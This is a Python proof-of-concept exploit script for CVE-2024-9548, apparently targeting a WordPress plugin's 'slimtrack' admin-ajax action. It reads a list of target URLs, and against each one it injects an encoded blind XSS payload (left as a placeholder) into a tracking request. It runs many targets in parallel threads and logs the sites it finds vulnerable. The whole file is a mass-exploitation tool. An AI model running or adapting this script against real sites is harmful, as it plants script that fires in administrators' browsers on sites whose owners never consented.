# Proof of Concept (PoC) for CVE-2024-9548
# Author: Khaled Nassar (@mindpatch)
# Looking for more PoCs? Check out: https://github.com/MindPatch/latestpocs/

import sys
import requests
import json
import urllib.parse
import argparse
import warnings
from rich.progress import Progress
from rich import print
import concurrent.futures
import re
import base64

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

def payload_generator(base_url):
    payload = "< YOUR BLIND XSS PAYLOAD >"
    full_url = urllib.parse.urljoin(base_url.replace("admin-ajax.php", "admin.php"), f"?page=slimview1&fs[resource]=hh{payload}fff")

    def html_encode_hex(string):
        return ''.join(f'&#x{ord(c):x};' for c in string)
    html_encoded_url = html_encode_hex(full_url)
    base64_encoded_url = base64.b64encode(html_encoded_url.encode()).decode()

    return base64_encoded_url

def generate_urls(base_url):
    return urllib.parse.urljoin(base_url, "/wp-admin/admin-ajax.php")

def check_vulns(url, payload):
    try:
        response = requests.post(url, data=payload, verify=False, timeout=10)
        if response.status_code == 200:
            match = re.search(r'\d{2}\.\w{32}', response.text)
            if match:
                return match.group(0)
    except Exception as e:
        print(f"[yellow]Error processing {url}: {str(e)}[/yellow]")
    return None

def main():
    parser = argparse.ArgumentParser(description="Check URLs for vulnerabilities")
    parser.add_argument('--output', type=str, help="Output file for results", default='results.json')
    parser.add_argument('--worker', type=int, help="Number of threads", default=5, dest="threads")
    args = parser.parse_args()

    vulns = []

    urls = []
    for url in sys.stdin:
        url = url.strip()
        url = generate_urls(url)
        urls.append(url)
    
    with Progress() as progress:
        task = progress.add_task("[green]Processing URLs...", total=len(urls))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as worker:
            for base_url in urls:
                def start(base_url):
                    progress.advance(task)
                    full_url = base_url 
                    payload = {
                        'action': 'slimtrack',
                        'ref': payload_generator(base_url),
                        'res': 'L2hhY2tlZC5waHA='
                    }
                    print(f"[blue]Checking {full_url}[/blue]")
                    result = check_vulns(full_url, payload)
                    if result:
                        vulns.append({'url': full_url, 'vulnerability': result})
                        print(f"[green]Vulnerability found: {result} at {full_url}[/green]")
                worker.submit(start, base_url)
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(vulns, f, indent=4)
        print(f"[green]Results saved to {args.output}[/green]")

if __name__ == '__main__':
    main()
